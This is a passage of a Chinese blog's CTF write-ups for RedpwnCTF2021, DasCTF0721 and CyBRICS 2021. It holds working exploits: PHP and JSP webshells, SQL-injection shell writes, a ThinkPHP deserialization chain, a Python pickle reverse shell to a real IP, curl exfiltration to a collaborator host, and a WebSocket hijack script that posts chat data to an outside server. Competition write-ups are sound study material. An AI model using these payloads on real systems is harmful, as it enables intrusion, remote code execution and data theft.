added\u0026quot;, \u0026quot;add water\u0026quot;) p.sendlineafter(\u0026quot;lumpy dough\u0026quot;, \u0026quot;hide the bowl inside a box\u0026quot;) p.sendlineafter(\u0026quot;to rise\u0026quot;, \u0026quot;wait 3 hours\u0026quot;) p.sendlineafter(\u0026quot;finish the dough\u0026quot;, \u0026quot;work in the basement\u0026quot;) p.sendlineafter(\u0026quot;needs to be baked\u0026quot;, \u0026quot;preheat the toaster oven\u0026quot;) p.sendlineafter(\u0026quot;for 45 minutes\u0026quot;, \u0026quot;set a timer on your phone\u0026quot;) p.sendlineafter(\u0026quot;awfully long time\u0026quot;, \u0026quot;watch the bread bake\u0026quot;) p.sendlineafter(\u0026quot;no time to waste\u0026quot;, \u0026quot;pull the tray out with a towel\u0026quot;) p.sendlineafter(\u0026quot;smoke in the air\u0026quot;, \u0026quot;unplug the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;in another room\u0026quot;, \u0026quot;open the window\u0026quot;) p.sendlineafter(\u0026quot;air rushes in\u0026quot;, \u0026quot;unplug the oven\u0026quot;) p.sendlineafter(\u0026quot;kitchen is a mess\u0026quot;, \u0026quot;wash the sink\u0026quot;) p.sendlineafter(\u0026quot;sink is cleaned\u0026quot;, \u0026quot;clean the counters\u0026quot;) p.sendlineafter(\u0026quot;counters are cleaned\u0026quot;, \u0026quot;flush the bread down the toilet\u0026quot;) p.sendlineafter(\u0026quot;is disposed of\u0026quot;, \u0026quot;get ready to sleep\u0026quot;) p.sendlineafter(\u0026quot;go to sleep\u0026quot;, \u0026quot;close the window\u0026quot;) p.sendlineafter(\u0026quot;window is closed\u0026quot;, \u0026quot;replace the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;alarm is replaced\u0026quot;, \u0026quot;brush teeth and go to bed\u0026quot;) p.interactive() p.close() 这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间\n后记 这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~\n就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼\n","date":"2021-08-08T20:08:39+08:00","permalink":"https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/","section":"posts","tags":["wp"],"title":"RedpwnCTF2021 Wp"},{"categories":["CTF"],"contents":"cat flag  简简单单cat flag\nHint: 管理员曾访问过flag\n \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt;提示管理员访问过，先cat /var/log/nginx/access.log\n之后用%fa绕过 /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx 重要文件目录：\n 配置文件存放目录：/etc/nginx 主要配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx/access.log  ezrce  你真的会 nodejs 吗？\n 是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：Yapi 存在远程命令执行漏洞\n那就好办了 跟着来就行咯；首先创建一个项目\n之后修改全局mock脚本\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() 之后添加接口\n脚本中的execSync()处可rce，先用wget http://xxxxx.burpcollaborator.net试试水\n很顺利嘛 好耶！\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp  easythinkphp\n 只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log 先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST['wuhu']);?\u0026gt; 传入后 用蚁剑连接就能拿flag了~\n或者也可以直接使用ThinkphpGUI一把梭！一键getshell 你值得拥有\njspxcms 也有现成的洞可以直接用，参考：复现jspxcms解压getshell漏洞 | 代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540) | 记一次由追踪溯源发现的“不安全解压getshell”\n首先构造含jsp🐎的恶意war包，🐎长这样\n\u0026lt;% if(\u0026quot;023\u0026quot;.equals(request.getParameter(\u0026quot;pwd\u0026quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026quot;wuhu\u0026quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026quot;\u0026lt;pre\u0026gt;\u0026quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;); } %\u0026gt; 之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() 需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署\n直接cat /flag就好啦\ncybercms  赛博CMS，只为安全而生\nHint：信息搜集是一个web手必备的技能\n 一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错\n在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西\n如何设置进站语言这篇里竟然是这样的草 真是蚌埠住了 图穷匕见了属于是2333333\n根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：Beescms_v4.0 sql注入漏洞分析\n在admin后加单引号，提示表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段\n简单fuzz可知：过滤了空格（用/**/绕过）（或者用tab绕过 或者%0a绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）\nuser=admin'/**/union/**/selselectect/**/1,2,3,4,5# 回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）\nadmin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'# 好耶，连蚁剑拿flag咯\nez_website  简单的题目\n 也是现实世界存在的东西，参考：齐博建站系统x1.0代码审计\n直接用已有的链子打\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output;  $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error  $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query  $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } 上传\n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 虽然会返回一个报错的页面，但是可以在/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php处验证一下是否写上了🐎，文件名字是md5('tag_'.md5($this-\u0026gt;tag))，连接密码是ccc 直接蚁剑\n在雪殇的wp中用的是另一个，更直接的写🐎方式，下面说一下思路（大概\n我们可以先尝试看看敏感函数file_put_contents()是否能利用\n在application/admin/controller/Upgrade.php下看到了文件写入的函数，它位于在writelog()中，这个函数的功能是处理post请求传入的各项参数\n这个config('client_upgrade_edition')捏，跟了一下 它会返回null，再往上看到_initialize()\n所以最后是会将$upgrade_edition写入中/runtime/client_upgrade_edtion.php中；而整个writelog()函数会被sysup()调用\n跟进这个sysup()和$upgrade_edtion，看是否可用+如何用\n在template/admin_style/default/admin/upgrade/index.htm下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看\n抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// 将🐎写进的目标页面/runtime/client_upgrade_edition.php连入蚁剑 拿flag即可\n————比赛的时候我其实是没有搜到齐博建站系统x1.0代码审计这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过\n安全,安全,还是xxx的安全  某个特别安全的商店\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT );  特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli任意注册账号，走一波流程\n😅蚌埠住了\n回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码\n注册时用post提交信息，密码部分用的是md5(app.users.password+'CBCTF')，支付密码是encrsa(app.users.pay_password)，好家伙 这个加密 pay_password部分md5+rsa+b64\u0026hellip;\u0026hellip;\n————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考wp之后的复现\n赛后讲题的时候 出题师傅说参考的是这一篇文章数据加密或成WAF失效最大元凶…（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段\n这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 就可以任意控制参数达到二次注入的效果\n公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭\n重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag\njj\u0026rsquo;s camera  jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点\nHint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应\n 也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：在吗宝贝？你点开这个网址看看[打开网站偷拍照片] | 点开一个网址我被记录了ip还偷拍了照片\n（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。\n前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx\u0026amp;url=xxx，这是qbl.php的源码\n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt;file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== 参考：wp\neasyweb 有一个docker的附件和一些源码\n首页就是个白底黑字的Hello World，审下源码\n直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: \u0026quot;justMyCode\u0026quot;: false这样可以在调用堆栈处看到完整的调用情况\n可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦\npayload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduce必须返回元组或字符串 def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) 构造请求的话还是老朋友~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; 参考：wp\neasyjava java 根本不会\n放个参考链接 溜了：wp1 wp2\n 最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）\n争取早收工吧，还有upload, xss, csrf, sqli\u0026hellip;\u0026hellip;等着总结 还有超级多东西要学要看\n学习好耶！σ`∀´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts)  Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! There’s a flag there, and it’s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 — looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely\n Scanner (rebyC, Baby, 50 pts)  Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n 不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面\n首先用Gif Super把帧间隔调为300ms，然后裁剪出中间有用的部分 放入GIF动态图片分解中看结果 都有在线工具就很方便\n所以这个破玩意到底是啥？猪？还是刺猬？ 别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone\u0026hellip;. 最后一个是二维码 比较麻烦\n再稍微调整一下尺寸，扫描就行了rm -rf’er (CTB, Baby, 166 pts)  Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all that’s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 — frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you\n 这个题 emmmmm 只要ssh一连接就会自动执行rm -rf /*的指令，当反应过来的时候系统已经删的连ls指令都不剩了\n先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了rm -rf /*，之后就可以顺畅的穿梭于这个buildbox之间拿flag了\n预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成\u0026quot;read\u0026quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中echo $\u0026lt;命令相当于read函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txt，即 读取flag.txt并输出\nAd Network (Web, Baby, 50 pts)  Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n 这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？\nemmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图 这个图在昨天做的时候看到， 内容是 awesome ad from adnetwork，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的\u0026hellip;\u0026hellip; （都怪edge!!!\n点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\n比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts)  Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project — ⚐ The Flag\nAnnouncement website\n 简约漂亮的前端\n有个输入邮箱的框，提交会发送一个post请求：digest=xxxx\u0026amp;email=xxxx 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(\u0026lsquo;1@1.com\u0026rsquo;) 随email而改变，尝试注入\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email='or'1\t// 回显正常 无报错 digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1')#\t// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1',1)#\t// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1 确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？\ninsert into table_name (email, timestamp) values (email, now()); 可利用的部分是可以插入的email，报错注入\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: '~announcement' digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~emails,logs' digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~log' digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}' 没什么好说的，经典报错注入流程：确定字段数-\u0026gt;爆数据库名(announcement)-\u0026gt;表名(emails, logs)-\u0026gt;字段名(log)-\u0026gt;具体数据 拿flag\nMultichat (Web, Medium, 138 pts)  Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\n 聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样\n抓包，看到了Connection: Upgrade Upgrade: websocket，这个聊天室是建立了一个websocket连接\n（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面\n链接里的一个csrf攻击的实例跟这个有点像了\n但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（Admin and tech support are members of a secret chat room.）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag\n（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）\n5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是来自w\u0026amp;m的脚本\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; 或者非预期解：在url部分进行xss，payload: javascript:location.href='http://vps/?cookie='+document.cookie（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag\n参考：HTML5 WebSocket | WebSocket安全问题分析 WebSocket断开原因分析 | Request.mode 使用 Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaborator模块详解 | Running Your Instance of Burp Collaborator Server（列入待完成计划\nASCII Terminal (Network, Baby, 116 pts)  Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\n nc连上以后可以看到一个bash $，题目的提示是\u0026quot;ASCII termial\u0026quot;\n把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具\ntoilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如\n可以玩出很多花样~\n书归正题，这里使用toilet -f bigascii9 +command的命令生成结果，将空格换为 .再发送即可\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 'cat flag.txt' \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt （值得注意的是 